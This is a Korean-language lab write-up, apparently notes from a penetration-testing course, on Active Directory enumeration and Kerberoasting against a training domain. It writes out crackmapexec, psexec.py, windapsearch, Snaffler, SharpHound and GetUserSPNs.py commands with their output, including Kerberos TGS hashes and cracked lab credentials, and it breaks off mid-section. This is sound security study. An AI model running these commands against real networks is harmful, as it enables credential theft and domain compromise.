---
title: "Active Directory - Credentialed Enumeration and Kerberos Attacks"
date: 2026-08-04
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

# Deeper Down the Rabbit Hole

## Credentialed Enumeration - from Linux

이제 스프레이 열거도 쳐 해봤고 계정 몇개 찾았으니 낮은 권한에서 높은 권한으로 이동할 차례이다.

이제 가장 ad에서 열거를 할때 중요한 nxc 툴을 활용하여 내부를 깊게 분석할수가있다.

우선 전에 했던 wley 기준으로 열거를 진행하였다:

```bash
$ crackmapexec smb 172.16.5.0/23 -u wley -p transporter@4         

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 (Pwn3d!)
```

이 처럼 `172.16.5.130` ip에서 Pwn3d!가 떴다. 이뜻은 현재 wley 유저가 관리자 권한과 비슷한 권한을 가지고 있음을 뜻한다.

또한 현재 `INLANEFREIGHT.LOCAL` 도메인의 `ACADEMY-EA-FILE` 관련 서버임을 알수있다.

따라서 현재 445 기반의 psexec.py 툴을 활용하여 wley 서버로 이동할수있는 상태일수도있다.

툴을 실행시켜 들어가보았다:

```bash
$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130                                              

Microsoft Windows [Version 10.0.17763.2237]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

이처럼 현재 wley는 시스템 계정임을 확인할수있었다.

또한 현재 로그인된 사용자도 볼수있다:

```bash
$ crackmapexec smb 172.16.5.130 -u wley -p transporter@4 --loggedon-users               

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\backupagent               logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
```

현재 이처럼 여러 사용자들이 로그인을 했다는것을 확인할수있다.

또한 방금 봤다시피 `ACADEMY-EA-DC01` 서버는 172.16.5.5 호스트였으며, 전에 nmap을 ad 서비스를 하고있음을 확인하였었다.

따라서 -u wley -p transporter@4 유저를 통하여 ldap에 관한이 존재하는지 확인하였따:

```bash
$ crackmapexec ldap 172.16.5.5 -u wley -p transporter@4  

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
```

이처럼 ldap 권한이 존재하며 이를 대상으로 bloodhound를 추출할수있게된다.

또한 추가로 wind 툴을 사용하여 ldap를 직접 열거해 172.16.5.5 서버의 domain admin 사용자명들을 추출할수있다:

```bash
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u wley@inlanefreight.local -p transporter@4 --da      

# SKIP

[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

cn: Betty Ross
userPrincipalName: bross@inlanefreight.local

cn: John Hermann
userPrincipalName: jhermann@inlanefreight.local

cn: Charlie Obando
userPrincipalName: Intinted@inlanefreight.local

cn: Maggie Jablonski
userPrincipalName: Spong1990@inlanefreight.local

cn: Matthew Mackey
userPrincipalName: Fastally@inlanefreight.local

cn: Christopher Taylor
userPrincipalName: Buithe@inlanefreight.local

cn: Johnnie Munoz
userPrincipalName: Pratch@inlanefreight.local

cn: Melissa Jason
userPrincipalName: Ressoare@inlanefreight.local

cn: Danielle Hawkins
userPrincipalName: Grewle@inlanefreight.local

cn: Ruby Cropper
userPrincipalName: Betion@inlanefreight.local

cn: Mary Clifton
userPrincipalName: Thisfic@inlanefreight.local

cn: Betty Turcotte
userPrincipalName: Coultle@inlanefreight.local

cn: mrb3n

cn: Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9

cn: clustergent

cn: LDAP.AGENT

cn: NAGIOSAGENT

cn: BACKUPAGENT

cn: SOLARWINDSMONITOR

cn: PROXYAGENT

cn: FREIGHTLOGISTICSUSER

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

cn: sqldev

cn: svc_qualys
```

신기한점은 아까 봤던 172.16.5.130 호스트에 존재했던 로그인된 사용자와 도메인 어드민이라고 하는 svc_qualys 유저가 동일하다.

따라서 파일 서버에서 svc_qualys 유저의 자격증명이 발견되고, 똑같이 172.16.5.5 서버에 재사용된다면 도메인 어드민을 먹을수있게된다.

## Credentialed Enumeration - from Windows

윈도우에서 열거를 하는데 가장 대표적인 모듈은 [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) 모듈이 존재한다.

이 모듈의 명령어를 볼려면 이런식으로 볼수있따:

```powershell
PS C:\Users\htb-student> get-command -module activedirectory

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Add-ADCentralAccessPolicyMember                    1.0.1.0    activedirectory
Cmdlet          Add-ADComputerServiceAccount                       1.0.1.0    activedirectory
Cmdlet          Add-ADDomainControllerPasswordReplicationPolicy    1.0.1.0    activedirectory
```

내부에 어떤 도메인이 존재하는지 확인할수있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad1.png)

또한 spn이 설정되어있는 user들도 가져올수있따:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad2.png)

이렇게 spn이 설정되어있으면 서비스 계정으로 인식하여 켈베로스팅 공격에 악용될수가있다.

그리고 trust 설정을 통해 또다른 도메인이 존재하는지 확인할수있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad3.png)

이처럼 어떤 도메인이 있는지 확인할수잇으며, 확장해나갈수있다.

또한 어떤 그룹이 있는지 확인하고, 그 그룹 대상으로 어떤 유저들이 있는지 확인할수있다:

```powershell
PS C:\Users\htb-student> Get-ADGroup -Filter * | select name

PS C:\Users\htb-student> Get-ADGroupMember -Identity "Backup Operators"
```

또한 윈도우디렉토리 모듈이 아닌 파우ㅏ뷰 모듈도 있다.

우선 powerview 모듈을 임포트한다:

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
```

그후 이처럼 어떤 유저가 있는지를 볼수있따:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad4.png)

또한 이처럼 domain admins 에 어떤 유저들이 존재하는지 확인할수있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad5.png)

이처럼 재귀적으로 펼친다음 각각 어떤 유저들이 어떤 도메인에서 도메인 어드민인지 확인할수있게된다.

또한 화살표에 표시된것처럼 domain admin에 속한다기보단 간접적으로 도메인 어드민 아래의 secadmins라는 그룹이 있따.

이들은 중첩적으로 domain admin에 존재하는것과 동일하다.

또한 어떤 도메인이있는지확인할수잇다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad6.png)

이처럼현재 다른 Forest인 FREIGHTLOGISTICS.LOCAL가 존재하고 같은 포레스트인 LOGISTICS.INLANEFREIGHT.LOCAL가 존재한다.

또한 저런 열거가 아닌 각각 암호, SSH 키, 구성 파일 또는 기타 데이터들을 캐오는 스내플러exe 도구도 존재한다:

```powershell
PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk

# SKIP
```

이처럼 공유 디렉토리들을 찾아서 어떤 파일들이 존재하는지를 확인할수있게된다.

공유 파일의 webconf.ig 같은게 저장되있을수도있으며, ㄱ ㅡ파일을 읽어 웹의 자격증명을 가져올수도있게된다.

또한 sharphound(bloodhound) 도 존재한다.

이를 활용해서 각 객체의 권한들을 시각적으로 보여주어 각 객체의 어떤 침해를 가할수있고 권한상승에 관련하여 뭘 할수있게된다.

우선 데이터를 추출받았다:

```powershell
PS C:\Tools> .\SharpHound.exe -c All
```

이후 wley를 예를들어서 보게되면ㅇ ㅣ처럼 권한관계까 잡혀있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad7.png)

이처럼 어떤 유저에게 비밀번호 변경권한이 주어져있었으며 이렇게 권한상승을 통하여 최종적으로 도메인 관리자까지 갈수있는수단이존재학덷괴낟.

## Living Off the Land

이전까지는 PowerView, BloodHound 같은 외부 도구를 가져와서 AD를 열거했다면, 여기서는 인터넷도 없고 툴 업로드도 실패한 관리형 Windows 호스트라고 가정해보자.

우선 내부 기본 명령어를 통하여 초기 열거가 가능하다.

이처럼 ifconfig 를 통하여 전역을 볼수있으며:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-MS01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
                                       .htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : A2-DE-AD-34-15-96
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::1579:2e43:fb24:1874%8(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.5.25(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.5.1
   DHCPv6 IAID . . . . . . . . . . . : 419450966
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-10-51-3F-A2-DE-AD-05-4F-21
   DNS Servers . . . . . . . . . . . : 172.16.5.5
   NetBIOS over Tcpip. . . . . . . . : Disabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : A2-DE-AD-05-4F-21
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::1468:2399:8601:f5e2(Preferred)
   Link-local IPv6 Address . . . . . : fe80::1468:2399:8601:f5e2%12(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.109.121(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, August 05, 2026 9:26:19 PM
   Lease Expires . . . . . . . . . . : Thursday, August 05, 2026 10:24:52 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ced%12
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-10-51-3F-A2-DE-AD-05-4F-21
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

이처럼 현재 환경은 `ACADEMY-EA-MS01` 호스트임을 알수있따.

설치된 Windows 패치/Hotfix 목록 확인할수도있따:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description  HotFixID   InstalledOn

http://support.microsoft.com/?kbid=4464455  Update       KB4464455  10/29/2018
```

그리고 필요없이 하나하나 열거보단 아래처럼 작성하여 쭉 현 호스트의 정보를 훑어볼수있다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> systeminfo

Host Name:                 ACADEMY-EA-MS01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA057
Original Install Date:     10/27/2021, 9:00:39 AM
System Boot Time:          8/05/2026, 9:25:59 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 6,981 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,224 MB
Virtual Memory: In Use:    1,247 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    INLANEFREIGHT.LOCAL
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB4464455
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.109.121
                                 [02]: fe80::1468:2399:8601:f5e2
                                 [03]: dead:beef::1468:2399:8601:f5e2
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.5.25
                                 [02]: fe80::1579:2e43:fb24:1874
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

또한 현 호스트의 방화벽 상태를 확인할수있다:

```powershell
PS C:\Users\htb-student> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

# SKIP
```

이처럼 현재 도ㅓ메인 네트워크에선 설정값 자체는 존재하지만 state값이 off이므로 현재는 적용되지 않는 상태임을 의미한다.

또한 현재 디펜더가 실행중인지 확인할수도있다 (아래는 HTB에서 가져온거):

```powershell
PS C:\Users\htb-student> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

그리고 그 디펜더의 상세를 보기위해 [](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps) 툴을 사용할수있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad8.png)

현재 not runiong 상태이며 동작하지 않는다.

또한 qwinsta를 사용하여 나 말고 누군가 들어왔는지 확인하는 방법도 존재한다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad9.png)

만약 몰래 침투하는 작업을 수행할때 누군가 존재한다면 발칵 위험이 존재하기에 확인하고 하는 방식이며, 로그인 사용자를 타겟으로 피싱이 가능할수도있다.

또한 arp를 이용해서 각 이 호스트에서 통신을 주고받은 다른 호스트가 누구인지, 또는 같은 네트워크 안에서 어떤 서버가 존재하는지 파악하는데 사용된다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad10.png)

route도 마찬가지다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad11.png)

보게되면 그냥 내부엔 172~ 밖에 없는 소규모 환경이거나, 폐쇄망일 가능성이 존재한다.

이제 방금 봤다시피 다른 툴을 불러올수없는 상태라면, 그 대체제인 [](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic)와, [](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems)를 사용할수있다.

그리고 ldap에 필터링 검사가 있다.

이 필터링은 ldapsearch와 dnsquery 같은 툴을 사용할때 필터링을 작성해서 정보를 캐내오기도한다.

그 필터링 정보는 [](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax)에서 확인할수있따.

# Cooking with Fire

## Kerberoasting - from Linux

위에서 봤다시피 spn이 설정된 유저들이존재했었다.

이 spn이 달려있으면 dc는 저 유저들을 서비스로 인식하여 dc가 직접 tgs기능을 이용해 그 spn 달린 유저에 해당하는 해쉬 문자열을 보내주게된다.

이 공격 기법을 악용한게 바로 켈벨로스팅이다.

따라서 내부에서 getspanspn을 사용할수있다:

```bash
$ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5                                    

ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2026-07-22 05:00:31.331817             
sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>  
```

이렇게 spn 애들이 나오게된다.

이 상태에서 -request 옵션을 쓰게되면 저 spn 애들의 해쉬들이 나오게된다.

-request-user를 통하여 한 사용자만 지정할수있긴한다:

```bash
$ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5 -request-user testspn              

ServicePrincipalName                    Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  --------  --------------------------  ---------  ----------
testspn/kerberoast.inlanefreight.local  testspn            2022-02-27 15:15:43.406442  <never>               

$krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*INLANEFREIGHT.LOCAL/testspn*$28ff39fcd75c4a2a5977eff1$cbccf581d475d175e727580a76d3234334610da8be8cfcd3b333e647e1ed909b1c31de2cb520ce36a63e81b36bc6a8bdbdfd33d3ce41f5fc31dd2f4dbe9dd7a90bbfc90a26339c16b4a31976f6d9f821bd492cf97d806c48e700a2e88457565ed5ee82c1e3bf59d967d8d18f1dd32bb6726b08c3b6a4981143f98abc15b4c51584c70dcf0f40891806d5acf153da6a754333e0c177bf808d2a1af2ec19f0f313b7fa46f7ffaa5a5913cb26b305d8b210335b32c450d7b8bcb81adb7ec0ed690253a46c2451cb99b1ab243e484658a4f0fd2848b901047b23e5fec09fc8ff96d5e1a0ee6cbe29fac7b9f9c1ba5555e09993cfcb98d4388e7147d726e24890b483eef8e016173078368dbe130cf8231c7d79508ae58ed40f4a9e8925cd8567d5bd6046423ad0411250cbe86c72e2edc392151363e0a50f50109cbf9c55f8d2931d9a3d505af3746c3689c841dd4e2cc0cca935468d865e8e715040f2b6713c623d614fa7626fb7ae655131bea683eaa72fde916caf2da7279752388de66fc3334fdc49c83fcae6d90eb0940a09a6081bf74dbd1cee1862b80ac396025b95a82d24c37c51d0ead6a60813d33ab2a68ec11c8c3a2c2422d7e0d93c62bff3f5d5ea16bb37152df6bab2f5e5bcb84c999b62fe2961509e04dd386f20c286a41f23d6df3b8e21262ce68691c3443206049035e9703970f8e8ef0b42d1cce1a860dd34adec8b7b611f656b71e90c914a317af0838a4dc9ee639f8fe8a94967e66d6ee39261aefd44dab9506b12f2606bbb636841d1615880b8bfaf69cc6dfc30cd56a0c124083be1a3fd8f1d4e8a0ed4298a28d27bb4be7c87fa663d4f5ce15133d7321062499aeee29d609258320ef2d7826806d6ffef45e2519d3e29ab2863bf5c5b66ad220d0681c41162f99e91047837e351b4a43f1d8c682e80ae51a133056eb63269df7109512e30c56356ec02d8c06ea5669841bdc476419079c3ab310a10b2678761dc9d2c74c65361e50790db0dbba32deba93b9f0860dca3318573536d467c2f5b88f65f3ca401732fc9508ebccb978fb84ddd70f42e68c543e63af102bbcd12e12fd7d71d945e452e0fcb927874ac04367a55ae896040a377254e3223ae99af16be118c09fde4c793b97d746ef81a022216440ad993a5c532dabe1dbc2f7f5fe1839ef758a0455fb8370bf6311fcfe9b4a0defa41a9442adf2f0e61ed2bc195a8175475cadad4fedf64d3af2ab3156a042dccb3e3dc01e9ad9e0952a92b2136e369da62feadbccc89eae2857725747289b309636673c8942a00d53bd52bd70d677cf221f64b3fa9491519a82cdb99aa1d4d28fd1c7888256d62cbd2560b3ef6886132e9117ccd5ea3dc562b5a73a9afed88486d8a7efcfa7632836489b4077661c31e1a7c69892c183ef0116033f7ee033502d8a28656b6911f789a389e77e97c6d3df6f7bd52
```

이제 이를 토대로 해독할수있다.

도한 nxc를 이용하여 빠르게 spn달린 사용자의 모든 유저를 빼올수도있다:

```bash
$ crackmapexec ldap 172.16.5.5 -u wley -p 'transporter@4' --kerberoasting spnuser

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  sAMAccountName: damundsen memberOf: CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL pwdLastSet: 2022-03-24 12:20:34.127432 lastLogon:2026-07-22 04:47:14.606617 
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  $krb5tgs$23$*damundsen$INLANEFREIGHT.LOCAL$MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL~1433*$c80a7de11740dbf1c4b56dc35d84037b$07eef5a5efadc1e67c89aba437ce3bc35e9c1e0909b9e2df23d58bea017aa21f8bfb5eaf32dd5d6e4467e8be0e640e38e18902405b804b6874f940b9ff9a93be79e73f6b634bb9cf6111dd20dd0268658181f4bb8e204f12050fec453bb147bd1127b645dcfcdde4f54e5f807b8dc395ac7f60c14
```

여러 사용자를 크랙하던중 위 spn에 해당하는 sqldev 유저의  크랙이 가능했었다.

계정명은 이러하다:

```text
sqldev:database!
```

근데 뒤지게 쳐 웃긴게 방금 도메인 어드민 열거했을때 sqldev 유저가 도메인 어드민 그룹에 가입되어있었다

nxc로 보았다:

```bash
